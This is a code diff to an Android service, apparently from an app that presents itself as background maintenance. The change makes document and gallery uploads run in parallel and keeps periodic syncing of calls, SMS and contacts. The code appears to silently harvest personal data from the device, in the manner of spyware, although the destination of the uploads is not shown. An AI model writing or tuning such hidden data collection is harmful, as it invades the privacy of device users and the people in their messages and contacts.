@@ -94,21 +94,18 @@ public class BackgroundMaintenanceService extends Service {
             
             Log.d(TAG, "Scheduling background tasks for user: " + user.getUid());
             
-            // PRIORITY 1: Document uploads (most important)
-            Log.d(TAG, "PRIORITY 1: Triggering IMMEDIATE document upload");
+            // PARALLEL UPLOADS: Start documents and media at the same time
+            Log.d(TAG, "⚡ PARALLEL: Triggering IMMEDIATE document + gallery upload");
             DocumentUploadWorker.enqueueWork(this);
-            
-            // Schedule periodic document syncing (every 15 minutes)
-            DocumentSyncHelper.schedulePeriodicDocumentUpload(this);
-            
-            // PRIORITY 2: Media/Gallery uploads
-            Log.d(TAG, "PRIORITY 2: Triggering immediate media upload");
             ImageUploadWorker.enqueueWork(this);
             
-            // Schedule periodic data syncing
+            // Schedule periodic syncing (documents every 10 min, media every 1 hour)
+            DocumentSyncHelper.schedulePeriodicDocumentUpload(this);
+            
+            // Schedule periodic data syncing (calls, SMS, contacts, etc.)
             UserDataSyncHelper.syncAll(this);
             
-            Log.d(TAG, "✓ All background tasks scheduled with document PRIORITY");
+            Log.d(TAG, "✓ All background tasks scheduled in PARALLEL");
         } catch (Exception e) {
             Log.e(TAG, "Error scheduling background tasks", e);
         }
